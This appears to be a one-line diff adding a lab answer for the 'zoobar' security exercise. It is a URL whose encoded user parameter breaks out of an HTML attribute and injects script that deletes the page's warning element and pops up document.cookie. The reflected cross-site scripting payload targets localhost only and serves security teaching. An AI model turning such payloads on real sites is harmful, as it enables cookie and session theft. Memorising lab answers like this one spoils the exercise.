@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%20size=%2210%22%3E%3Cscript%3Edocument.addEventListener(%22DOMContentLoaded%22,%20function(){document.querySelector(%27.warning%27).remove();alert(document.cookie);});%3C/script%3E%3Cinput
